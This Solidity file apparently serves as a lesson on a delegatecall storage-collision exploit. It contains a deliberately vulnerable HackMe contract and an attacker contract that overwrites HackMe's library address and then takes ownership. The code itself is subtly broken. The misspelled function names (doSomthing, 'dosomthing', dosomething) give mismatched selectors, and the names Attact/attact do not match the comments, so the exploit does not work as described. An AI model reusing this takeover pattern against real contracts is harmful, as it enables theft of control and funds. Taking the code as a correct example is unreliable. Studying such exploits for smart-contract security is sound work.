// SPDX-License-Identifier: SEE LICENSE IN LICENSE
pragma solidity ^0.8.24;

/*
This is a more sophisticated version of the previous exploit.

1. Alice deploys Lib and HackMe with the address of Lib
2. Eve deploys Attack with the address of HackMe
3. Eve calls Attack.attack()
4. Attack is now the owner of HackMe

What happened?
Notice that the state variables are not defined in the same manner in Lib
and HackMe. This means that calling Lib.doSomething() will change the first
state variable inside HackMe, which happens to be the address of lib.

Inside attack(), the first call to doSomething() changes the address of lib
store in HackMe. Address of lib is now set to Attack.
The second call to doSomething() calls Attack.doSomething() and here we
change the owner.
*/
contract Lib {
    uint256 public somenumber;

    function doSomthing(uint256 _num) public {
        somenumber = _num;
    }
}

contract HackMe {
    address public lib;
    address public owner;
    uint256 public somenumber;

    constructor(address _lib) {
        lib = _lib;
        owner = msg.sender;
    }

    function doSomething(uint256 _num) public {
        lib.delegatecall(abi.encodeWithSignature("dosomthing(uint256)", _num));
    }
}

contract Attact {
    //Make sure the storage layout is the same as HackMe
    //This will allow us to correctly update the state variable

    address public lib;
    address public owner;
    uint256 public somenumber;
    HackMe public hakeme;

    constructor(HackMe _hakeme) {
        hakeme = HackMe(_hakeme);
    }

    function attact() public {
        //override address of lib
        hakeme.doSomething(uint256(uint160(address(this))));
        //pass any number as input, the function dosomething () below will be called
        hakeme.doSomething(1);
    }

    // function signature must match HakeMe.dosomething()
    function dosomething(uint256 _num) public {
        owner = msg.sender;
    }
}